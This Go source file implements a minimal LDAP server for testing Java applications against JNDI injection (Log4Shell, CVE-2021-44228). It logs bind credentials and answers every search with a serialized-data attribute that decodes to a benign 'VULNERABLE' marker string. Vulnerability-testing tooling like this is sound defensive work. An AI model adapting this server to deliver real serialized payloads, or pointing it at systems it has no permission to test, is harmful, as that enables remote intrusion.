package main

import (
	"encoding/base64"
	"fmt"
	"github.com/urfave/cli/v2"
	"log"
	"os"
	"os/signal"
	"syscall"

	"github.com/lor00x/goldap/message"
	ldap "github.com/vjeantet/ldapserver"
)

func main() {
	app := &cli.App{
		Name:  "jndi-ldap-test-server",
		Description:
			"A minimalistic LDAP server that is meant for test vulnerability to JNDI+LDAP injection attacks" +
			"in Java, especially CVE-2021-44228.",
		Usage: "jndi-ldap-test-server [options]",
		Flags: []cli.Flag{
			&cli.IntFlag{
				Name:    "port",
				Aliases: []string{"p"},
				Usage:   "port to listen on",
				Value: 1389,
			},
			&cli.StringFlag{
				Name: "listen-address",
				Usage: "network address to listen on",
				Value: "0.0.0.0",
			},
		},
		Action: runApp,
	}
	err := app.Run(os.Args)
	if err != nil {
		log.Fatal(err)
	}
}

func runApp(c *cli.Context) error {
	ldap.Logger = log.New(os.Stdout, "[server] ", log.LstdFlags)

	server := ldap.NewServer()
	routes := ldap.NewRouteMux()
	routes.Bind(handleBind)
	routes.Search(handleSearch)
	server.Handle(routes)

	bindAddress := c.String("listen-address")
	port := c.Int("port")

	go func() {
		err := server.ListenAndServe(fmt.Sprintf("%s:%d", bindAddress, port))
		if err != nil {
			log.Fatalf("Cannot open server: %v", err)
		}
	}()

	// Quit gracefully on SIGINT (CTRL-C) and SIGTERM
	ch := make(chan os.Signal)
	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
	<-ch
	close(ch)

	server.Stop()

	return nil
}

func handleSearch(w ldap.ResponseWriter, m *ldap.Message) {
	r := m.GetSearchRequest()

	log.Printf("Request BaseDn=%s", r.BaseObject())
	log.Printf("Request Filter=%s", r.Filter())
	log.Printf("Request FilterString=%s", r.FilterString())
	log.Printf("Request Attributes=%s", r.Attributes())
	log.Printf("Request TimeLimit=%d", r.TimeLimit().Int())

	e := ldap.NewSearchResultEntry("")
	e.AddAttribute("javaClassName", "foo")
	e.AddAttribute("javaSerializedData", message.AttributeValue(vulnerableStringPayload))
	w.Write(e)

	res := ldap.NewSearchResultDoneResponse(ldap.LDAPResultSuccess)
	w.Write(res)
}

func handleBind(w ldap.ResponseWriter, m *ldap.Message) {
	r := m.GetBindRequest()
	log.Printf("Bind User=%s, Pass=%s", string(r.Name()), string(r.AuthenticationSimple()))
	res := ldap.NewBindResponse(ldap.LDAPResultSuccess)
	w.Write(res)
}

var vulnerableStringPayload = mustDecodeBase64("rO0ABXQAEiEhISBWVUxORVJBQkxFICEhIQ==")

func mustDecodeBase64(value string) []byte {
	byteData, err := base64.StdEncoding.DecodeString(value)
	if err != nil {
		log.Panicf("Unexpected failure to decode base64 string \"%s\": %e", value, err)
	}
	return byteData
}